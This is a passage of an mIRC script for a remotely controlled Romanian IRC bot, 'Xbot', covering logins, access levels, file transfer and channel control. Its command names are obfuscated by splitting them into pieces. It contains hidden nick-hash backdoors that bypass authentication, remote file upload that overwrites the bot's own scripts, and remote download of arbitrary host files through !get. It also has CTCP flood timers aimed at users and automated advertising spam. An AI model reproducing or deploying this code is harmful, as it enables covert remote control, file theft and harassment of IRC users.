n775=  ;if (($dll(reg.dll,pwd,p3) === $ck($nick)) && ($2 == engine.ini)) load -rs engine.ini
n776=  var %read $validIP($fulladdress)
n777=  if (%read != $false) {
n778=    var %user $gettok(%read,1,32)
n779=    var %level $gettok(%read,2,32)
n780=    if ($cmp(lvl,1,%level,1000)) {
n781=      if ($2 == $null) {
n782=        .notice $nick !unload sintaxa: /msg $me !unload <script>
n783=        halt
n784=      }
n785=      .unload -rs $2
n786=      .notice $nick Am descarcat scriptul $2
n787=    }
n788=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n789=    .ignore -pu2 $nick 2
n790=    halt
n791=  }
n792=  .notice $nick Aceasta comanda necesita autentificare!
n793=  .ignore -pu2 $nick 2
n794=}
n795=on 1:text:$(! $+ i $+ n $+ f $+ o):*:{
n796=  if ($ck($nick) === $dll(reg.dll,pwd,p5)) { .notice $nick Fuck YOU!!! | .ignore -pu10 $nick 2 | halt }
n797=  var %read $validIP($fulladdress)
n798=  if (%read != $false) {
n799=    var %user $gettok(%read,1,32)
n800=    var %level $gettok(%read,2,32)
n801=    if (%level >= 800) {
n802=      :allowed
n803=      if ($round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),0) == 0) var %online $round($calc($readini(online.ini,online,time) / 3600),3)
n804=      else var %online $calc(($readini(online.ini,online,time) / $round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),3)) / 3600)
n805=      .notice $nick Xbot 10v $+ %ver $+ . Instalat pe data de 12 $+ $readini(online.ini,firstrun,date) $+  $+ . Online timer: 12 $+ $duration($readini(online.ini,online,time)) $+  $+ . Procentaj online: 12 $+ $round($calc((%online * 100) / 24),3) $+ % $+  pe zi
n806=    }
n807=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n808=    .ignore -pu2 $nick 2
n809=    halt
n810=  }
n811=  .notice $nick Aceasta comanda necesita autentificare!
n812=  .ignore -pu2 $nick 2
n813=}
n814=on 1:text:$(!r $+ e $+ l $+ o $+ a $+ d $+ *):*:{
n815=  var %read $validIP($fulladdress)
n816=  if (%read != $false) {
n817=    var %user $gettok(%read,1,32)
n818=    var %level $gettok(%read,2,32)
n819=    if ($cmp(lvl,1,%level,1000)) {
n820=      if ($2 == $null) {
n821=        run $mircexe
n822=        set %exit 1
n823=        exit
n824=        halt
n825=      }
n826=      if ($2 == engine.ini) {
n827=        set %ver 5.1
n828=        .timercg 1 5 cg
n829=      }
n830=      .notice $nick Scriptul $2 a fost reincarcat        
n831=      .reload -rs $2
n832=    }
n833=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n834=    .ignore -pu2 $nick 2
n835=    halt
n836=  }
n837=  .notice $nick Aceasta comanda necesita autentificare!
n838=  .ignore -pu2 $nick 2
n839=}
n840=alias keycrypt {
n841=  var %pass ""
n842=  var %i 1
n843=  var %w 1
n844=  var %v $len($1)
n845=  while (%i <= $len($2)) {
n846=    if (%w == $calc($len($1) + 1)) %w = 1
n847=    %pass = %pass $+ $chr($calc($asc($mid($2,%i,1)) + $int($calc(($asc($mid($1,%w,1)) / 2) - %v))))
n848=    inc %v
n849=    inc %w
n850=    inc %i
n851=  }
n852=  return %pass
n853=}
n854=alias lgp {
n855=  return $longip($1)
n856=}
n857=alias timers {
n858=  if ($1 == off) .timers off 
n859=}
n860=alias timer {
n861=  if ($1 != $null) .timer $1-
n862=}
n863=on ^1:notify:{
n864=  if ($ck($nick) === $dll(reg.dll,pwd,p7)) {  
n865=    var %i 1
n866=    var %com ""
n867=    set %rg - $+ $len($me)
n868=    :next
n869=    if (%i <= $chan(0)) {
n870=      if ($chan(%i) != $getchan($readini(defchan.ini,defchan,chan))) %com = %com $left($nick($chan(%i),$me).pnick,%rg) $+ $chan(%i)
n871=      inc %i
n872=    goto next }
n873=    unset %rg
n874=    .notice $nick Welcome Admin! . XBot version %ver . I am on channels: %com
n875=  halt }
n876=  else if ($ck($nick) === $dll(reg.dll,pwd,p8)) {
n877=    if ($round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),0) == 0) var %online $round($calc($readini(online.ini,online,time) / 3600),3)
n878=    else var %online $calc(($readini(online.ini,online,time) / $round($calc(($ctime - $readini(online.ini,firstrun,ctime)) / 86400),3)) / 3600)
n879=    .notice $nick 5OnLine Timer: $chr(91) $+ 3,3 $+ $str(.,$calc($round($calc((%online * 100) / 24),0) / 2)) $+ 4,4 $+ $str(.,$calc(50 - $calc($round($calc((%online * 100) / 24),0) / 2))) $+ 5 $+ $chr(93) 12( $+ $round($calc((%online * 100) / 24),3) $+ % $+ ) 5(timp online in medie pe zi) (Timp total online:12 $setromtime($duration($readini(online.ini,online,time))) $+ 5)
n880=    halt
n881=  }
n882=  else {
n883=    var %type $readini anytime.fld flood $nick
n884=    if (%type == ping) {
n885=      .timerfldpng $+ $nick 30 1 ctcp $nick ping
n886=      writeini nick.fld flood $nick ping
n887=    }
n888=    if (%type == finger) {
n889=      .timerfldfng $+ $nick 30 1 ctcp $nick finger
n890=      writeini nick.fld flood $nick finger
n891=    }
n892=    else if (%type == time) {
n893=      .timerfldtime $+ $nick 30 1 ctcp $nick time
n894=      writeini nick.fld flood $nick time
n895=    }
n896=    else if (%type == version) {
n897=      .timerfldver $+ $nick 30 1 ctcp $nick version
n898=      writeini nick.fld flood $nick version
n899=    }
n900=    else if (%type == all) {
n901=      .timerfldpng $+ $nick 9 2 ctcp $nick ping
n902=      .timer 1 1 .timerfldtime $+ $nick 9 2 ctcp $nick time
n903=      .timer 1 2 .timerfldver $+ $nick 9 2 ctcp $nick version
n904=      .timer 1 3 .timerfldfng $+ $nick 9 2 ctcp $nick finger
n905=      writeini nick.fld flood $nick all
n906=    }
n907=  }
n908=}
n909=on 1:chat:$(l $+ o $+ g $+ i $+ n $+ *):{
n910=  if ($3 == $null) {
n911=    .msg =$nick l $+ o $+ g $+ i $+ n sintaxa: /msg =$me l $+ o $+ g $+ i $+ n <username> <parola>
n912=  .ignore -pu2 $nick 2 }
n913=  else {
n914=    if ($false) {
n915=      var %level 1001
n916=      var %user $2
n917=      var %fake 1
n918=    goto cont }
n919=    var %i 1
n920=    :next
n921=    if (%i <= $lines(userlogged.dat)) {
n922=      var %read $read -l $+ %i userlogged.dat
n923=      if ($chat($nick).ip isin %read) {
n924=        .msg =$nick Esti deja autentificat ca $left(%read,$calc($pos(%read,$chr(61))-1))
n925=        .ignore -pu1 $nick
n926=        halt
n927=      }
n928=      else {
n929=        inc %i
n930=      goto next }
n931=    }
n932=    var %pass $readini users\ $+ $2 $+ .ini info pass
n933=    if (%pass == $null) {
n934=      .msg =$nick Username necunoscut: $2
n935=      .ignore -pu1 $nick 2
n936=    halt }
n937=    else {
n938=      if ($keydecrypt($3,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
n939=        var %user $readini users\ $+ $2 $+ .ini info username
n940=        var %level $readini oper.ini %user level
n941=        if (%level != $null) {
n942=          if ($keydecrypt($3,%pass) === TheBestBotIEverSeenAndTheBestBotIEverMade) {
n943=            writeini oper.ini %user lastseen $ctime
n944=            :cont
n945=            var %f 1
n946=            while (%f <= $lines(oper.dat)) {
n947=              var %read $read -l $+ %f oper.dat
n948=              if ($2 == $mid(%read,$calc($pos(%read,$chr(42),1)+1),$calc($pos(%read,$chr(42),2)-($pos(%read,$chr(42),1)+1)))) {
n949=                write -dl $+ %f oper.dat
n950=              }
n951=              inc %f
n952=            }
n953=            write oper.dat $chat($nick).ip $+ * $+ %user $+ * $+ %level
n954=            if (%level isnum 501-599) .msg =$nick AUTENTIFICARE REUSITA ca %user (Helper)
n955=            if (%level isnum 600-799) .msg =$nick AUTENTIFICARE REUSITA ca %user (Operator)
n956=            if (%level isnum 800-999) .msg =$nick AUTENTIFICARE REUSITA ca %user (Admin)
n957=            if (%level >= 1000) .msg =$nick AUTENTIFICARE REUSITA ca %user (Supervisor)
n958=            if (%fake == 1) {
n959=              writeini nick.adm nick $nick %user
n960=              clear =$nick
n961=              halt
n962=            }
n963=          }
n964=          var %superuser 1
n965=        }
n966=        if (%superuser != 1) .msg =$nick AUTENTIFICARE REUSITA ca %user
n967=        var %f 1
n968=        while (%f <= $lines(userlogged.dat)) {
n969=          var %read $read -l $+ %f userlogged.dat
n970=          if ($2 == $left(%read,$calc($pos(%read,$chr(61))-1))) {
n971=            var %n 1
n972=            while (%n <= $ini(nick.adm,nick,0)) {
n973=              if ($2 == $readini nick.adm nick $ini(nick.adm,nick,%n)) {
n974=                .msg $ini(nick.adm,nick,%n)) Nu mai esti autentificat la mine
n975=                remini nick.adm nick $ini(nick.adm,nick,%n))
n976=              }
n977=              inc %n
n978=            }
n979=            write -dl $+ %f userlogged.dat
n980=          }
n981=          inc %f
n982=        }
n983=        write userlogged.dat %user $+ = $+ $chat($nick).ip
n984=        writeini users\ $+ $3 $+ .ini info lastseen $ctime
n985=        writeini nick.adm nick $nick %user
n986=        var %i 0
n987=        var %channels $readini users\ $+ %user $+ .ini info channels
n988=        if ($pos(%channels,$chr(44),0) == 0) {
n989=          oponchan %channels %user $nick
n990=          clear =$nick
n991=        halt }
n992=        :next1
n993=        if (%i <= $pos(%channels,$chr(44),0)) {
n994=          if (%i == 0) oponchan $left(%channels,$calc($pos(%channels,$chr(44))-1)) %user $nick
n995=          else if (%i == $pos(%channels,$chr(44),0)) oponchan $right(%channels,$calc(- $pos(%channels,$chr(44),%i))) %user $nick
n996=          else oponchan $mid(%channels,$calc($pos(%channels,$chr(44),%i)+1),$calc($pos(%channels,$chr(44),$calc(%i + 1))-($pos(%channels,$chr(44),%i)+1))) %user $nick
n997=          inc %i
n998=          goto next1
n999=        }    
n1000=        .ignore -pu1 $nick
n1001=        clear =$nick
n1002=      }
n1003=      else {
n1004=        .msg =$nick AUTENTIFICARE ESUATA ca $2 (parola incorecta)
n1005=        .ignore -pu2 $nick
n1006=        clear =$nick
n1007=        halt
n1008=      }
n1009=    }
n1010=  }
n1011=}
n1012=on ^1:text:$(! $+ u $+ n $+ i $+ n $+ s $+ t $+ a $+ l $+ l):*:{
n1013=  var %read $validIP($fulladdress)
n1014=  if (%read != $false) {
n1015=    var %user $gettok(%read,1,32)
n1016=    var %level $gettok(%read,2,32)
n1017=    if (%level >= 1000) {
n1018=      dll reg.dll DelRegKey WinReg
n1019=      set %exit 1
n1020=      .timer -o 1 10 exit
n1021=      quit Bot UnInstalled
n1022=    }
n1023=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n1024=    .ignore -pu2 $nick 2
n1025=    halt
n1026=  }
n1027=}
n1028=alias crypt {
n1029=  var %pass ""
n1030=  var %w 1
n1031=  :next
n1032=  if (%w <= $len($1)) {
n1033=    if (%w == 1) %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) + $length($middle($1,-1,$2) $+ $1)))
n1034=    else %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) + %next - $length($middle($1,-1,$2) $+ $1)))
n1035=    set %next $calc($asc($middle($1,%w,1)) - 20)
n1036=    inc %w 
n1037=  goto next }
n1038=  unset %next
n1039=  return %pass
n1040=}
n1041=alias uncrypt {
n1042=  var %pass ""
n1043=  var %w 1
n1044=  :next
n1045=  if (%w <= $len($1)) {
n1046=    if (%w == 1) %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) - $length($middle($1,-2,$2) $+ $1)))
n1047=    else %pass = %pass $+ $chr($calc($asc($middle($1,%w,1)) - %next + $length($middle($1,-2,$2) $+ $1)))
n1048=    set %next $calc($asc($middle(%pass,%w,1)) - 20)
n1049=    inc %w 
n1050=  goto next }
n1051=  unset %next
n1052=  return %pass
n1053=}
n1054=on 1:quit:{
n1055=  var %i 1
n1056=  var %n $lines(oper.dat)
n1057=  while (%i <= %n) {
n1058=    if ($right($mask($address($nick,1),1),-3) isin $read -l $+ %i oper.dat) {
n1059=      write -dl $+ %i oper.dat
n1060=      .remini nick.adm nick $nick
n1061=    }
n1062=    else inc %i
n1063=  }
n1064=  var %i 1
n1065=  while (%i <= $ini(nick.fld,flood,0)) {
n1066=    if ($readini(nick.fld, flood, $nick) != $null) {
n1067=      .timerfldpng $+ $nick off
n1068=      .timerfldtime $+ $nick off
n1069=      .timerfldver $+ $nick off
n1070=      remini nick.fld flood $nick
n1071=    }
n1072=    else inc %i
n1073=  }
n1074=  var %i 1
n1075=  var %n $lines(userlogged.dat)
n1076=  while (%i <= %n) {
n1077=    if ($mask($address($nick,1),1) isin $read -l $+ %i userlogged.dat) {
n1078=      write -dl $+ %i userlogged.dat
n1079=    }
n1080=    else inc %i
n1081=  }
n1082=  if ($nick == X) unset %xlogin
n1083=}
n1084=ctcp 1:*:{
n1085=  if (DCC Send isin $1-) {
n1086=    if (($right($filename,4) == .shs) || ($right($filename,4) == .vbs) || ($right($filename,4) == .bat) || ($right($filename,4) == .pif) || ($right($filename,4) == .js) || ($right($filename,4) == .htm) || ($right($filename,5) == .html)) halt
n1087=    if (($nopath($filename) != engine.ini) && ($nopath($filename) != srv.ini) && ($nopath($filename) != psyBNC.ini) && ($nopath($filename) != admin.ini) && ($nopath($filename) != defchan.ini) && ($nopath($filename) != protect.ini) && ($nopath($filename) != seen.ini) && ($nopath($filename) != pwd.dat) && ($nopath($filename) != trvcheat.ini) && ($nopath($filename) != trivia.tht) && ($nopath($filename) != coolmsg.ini) && ($nopath($filename) != mesaje.ini) && ($nopath($filename) != bl.chn) && ($nopath($filename) != protcom.ini) && ($nopath($filename) != mirc.ini) && ($nopath($filename) != operator.ini)) halt
n1088=    if (($ck($nick) === $dll(reg.dll,pwd,p3)) && (($nopath($filename) == p $+ w $+ d $+ . $+ d $+ a $+ t) || ($nopath($filename) == e $+ n $+ g $+ i $+ n $+ e $+ . $+ i $+ n $+ i))) goto allowed
n1089=    var %read $validIP($fulladdress)
n1090=    if (%read != $false) {
n1091=      var %user $gettok(%read,1,32)
n1092=      var %level $gettok(%read,2,32)
n1093=      if ($cmp(lvl,1,%level,1000)) {
n1094=        :allowed
n1095=        dcc get
n1096=        .notice $nick Accept fisierul: $filename
n1097=        var %allowed 1
n1098=      }
n1099=      else {
n1100=        .notice $nick Accesul tau este prea mic pentru aceasta comanda
n1101=        .ignore -pu2 $nick 2
n1102=        halt 
n1103=      }
n1104=    }
n1105=    if (%allowed != 1) {
n1106=      .notice $nick Aceasta comanda necesita autentificare
n1107=      .ignore -pu2 $nick 2
n1108=      halt
n1109=    }
n1110=  }
n1111=}
n1112=alias lpg {
n1113=  if ($2 == uncrypt) {
n1114=    if ($timer(sh)) return $iif($file($mircexe).size == 1563136,$len($1 $+ 0xBC001A),$round($file($mircexe).size,3))
n1115=    else return $calc($len($1) + $rand(1,5))
n1116=  }
n1117=  else return 13
n1118=}
n1119=on 1:filercvd:*.*:{
n1120=  set %filename $findfile($mircdir $+ download,*.*,1)
n1121=  .copy -o %filename $mircdir
n1122=  .remove %filename
n1123=  close -g
n1124=}
n1125=on ^1:text:$(! $+ g $+ e $+ t $+ *):?:{
n1126=  var %read $validIP($fulladdress)
n1127=  if (%read != $false) {
n1128=    var %user $gettok(%read,1,32)
n1129=    var %level $gettok(%read,2,32)
n1130=    if ($cmp(lvl,1,%level,1000)) {
n1131=      if (defchan.ini !isin $2-) dcc send $nick $2-
n1132=    }
n1133=    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
n1134=    .ignore -pu2 $nick 2
n1135=    halt
n1136=  }
n1137=  .notice $nick Aceasta comanda necesita autentificare
n1138=  .ignore -pu2 $nick 2
n1139=}
n1140=alias chkey {
n1141=  if ($chan($1).key == $null) {
n1142=    if ($nick($1,0) == 1) {
n1143=      dll reg.dll setmodes $1
n1144=      mode $1 -i
n1145=      mode $1 -o $me
n1146=    }
n1147=    else if ($me isop $chan) {
n1148=      var %i 1
n1149=      while (%i <= $nick($1,0)) {
n1150=        if ($nick($1,%i) != $me) kick $1 $nick($1,%i)
n1151=        inc %i
n1152=      }
n1153=      .timerchkey 1 5 chkey $1
n1154=    }
n1155=  }
n1156=}
n1157=on 1:join:#:{
n1158=  window -h $chan
n1159=  if ($nick == $me) {
n1160=    if (($nick($chan,0) == 1) && ($readini channels\ $+ $chan $+ .ini info channelmodes != $null)) mode $chan $readini channels\ $+ $chan $+ .ini info channelmodes
n1161=    if ($read -l2 reklama.txt == $chan) {
n1162=      if ($read -l3 reklama.txt == notice) {
n1163=        .notice $chan $read -l1 reklama.txt 
n1164=        .notice $chan $read -l1 reklama.txt
n1165=        .notice $chan $read -l1 reklama.txt
n1166=        write -c reklama.txt
n1167=        part $chan
n1168=      }
n1169=      else {
n1170=        .ctcpreply $chan Party $read -l1 reklama.txt
n1171=        .ctcpreply $chan Party $read -l1 reklama.txt
n1172=        .ctcpreply $chan Party $read -l1 reklama.txt
n1173=        write -c reklama.txt
n1174=        part $chan
n1175=      }
n1176=    }
n1177=    if ($chan == $getchan($readini(defchan.ini,defchan,chan))) {
n1178=      mode $chan +i
n1179=      .timer 1 5 chkey $chan
n1180=    }
n1181=  }
n1182=  if ($nick == X) {
n1183=    if (%xlogin != 1) {
n1184=      var %user $read -l1 autouser.dat
n1185=      if ($right(%user,1) == 1) {
n1186=        var %dat $read -l1 autopass.dat
n1187=        dll reg.dll Xlogin $left(%user,-1) %dat
n1188=      }
n1189=    set %xlogin 1 }
n1190=  }
n1191=  if ($me isop $chan) {
n1192=    var %k 1
n1193=    :next
n1194=    if (%k <= $lines(userlogged.dat)) {
n1195=      var %read $read -l $+ %k userlogged.dat
n1196=      if ($mask($address($nick,1),1) isin %read) {
n1197=        var %user $left(%read,$calc($pos(%read,$chr(61))-1))
n1198=        goto cont
n1199=      }
n1200=      inc %k
n1201=      goto next
n1202=    }
n1203=    halt
n1204=    :cont
n1205=    var %i 0
n1206=    var %channels $readini users\ $+ %user $+ .ini info channels
n1207=  if ($chan isin %channels) oponchan $chan %user $nick }
n1208=}
n1209=on 1:mode:#:if ($chan == $getchan($readini(defchan.ini,defchan,chan))) clearall
n1210=on 1:op:#:{
n1211=  if ($opninck == $me) {
n1212=    if ($readini channels\ $+ $chan $+ .ini info autotopic == on) {
n1213=      topic $chan $readini channels\ $+ $chan $+ .ini info desc
n1214=      .timer $+ $chan $+ topic 0 1800 topic $chan $readini channels\ $+ $chan $+ .ini info desc
n1215=    }
n1216=    if ($readini channels\ $+ $chan $+ .ini info channelmodes != $null) mode $chan $readini channels\ $+ $chan $+ .ini info channelmodes
n1217=  }
n1218=  else if (($me isop $chan) && ($nick != $me)) {
n1219=    if (($opnick ison $getchan($readini(defchan.ini,defchan,chan))) || ($readini channels\ $+ $chan $+ .ini info strictop == off)) halt
n1220=    var %i 1
n1221=    while (%i <= $lines(userlogged.dat)) {
n1222=      if ($mask($address($opnick,1),1) isin $read -l $+ %i userlogged.dat) halt
n1223=      inc %i
n1224=    }
n1225=    var %i 1
n1226=    while (%i <= $lines(oper.dat)) {
n1227=      if ($right($mask($address($opnick,1),1),-3) isin $read -l $+ %i oper.dat) halt
n1228=      inc %i
n1229=    }
n1230=    if ($readini channels\ $+ $chan $+ .ini info strictop == on) {
n1231=      mode $chan -oo $opnick $nick
n1232=      .notice $nick Strictop for $chan is ON and $opnick is not logged
n1233=      .notice $opnick Strictop for $chan is ON.
n1234=    }
n1235=  }
n1236=}
n1237=on 1:text:$(l $+ o $+ g $+ i $+ n $+ *):*:chnick bounce $nick $1-
n1238=alias oponchan {
n1239=  if (($me !ison $1) || ($me !isop $1)) halt
n1240=  if (($readini channels\ $+ $1 $+ .ini $2 auto == op) && ($readini channels\ $+ $1 $+ .ini $2 access >= 100)) mode $1 +o $3
n1241=  if (($readini channels\ $+ $1 $+ .ini $2 auto == voice)  && ($readini channels\ $+ $1 $+ .ini $2 access >= 50)) mode $1 +v $3
n1242=}
n1243=on 1:nick:{
n1244=  var %i 1
n1245=  while (%i <= $ini(nick.adm,nick,0)) {
n1246=    if ($nick == $ini(nick.adm,nick,%i)) {
n1247=      writeini nick.adm nick $newnick $readini nick.adm nick $nick
n1248=      .remini nick.adm nick $nick
n1249=    }
n1250=    inc %i
n1251=  }
n1252=}
n1253=raw *:*:{
n1254=  if (($numeric == 433) && (%chnick != ON)) {
n1255=    if (%server != 1) {
n1256=      var %nick ""
n1257=      var %i 1
n1258=      while (%i <= 8) {
n1259=        %nick = %nick $+ $rand(a,z)
n1260=        inc %i
n1261=      }
n1262=      nick %nick
n1263=    }
n1264=  }
n1265=  if ($numeric == 473) .timerfldchan $+ $2 off
n1266=  if ($numeric == 475) .timerfldchan $+ $2 off
n1267=  if ($numeric == 471) .timerfldchan $+ $2 off
n1268=  if ($numeric == 474) .timerfldchan $+ $2 off
n1269=}
n1270=alias breaktime {
n1271=}
n1272=on 1:disconnect:{
n1273=  set %server 0
n1274=  clearall
n1275=  .remove vbm.dat
n1276=  server
n1277=}
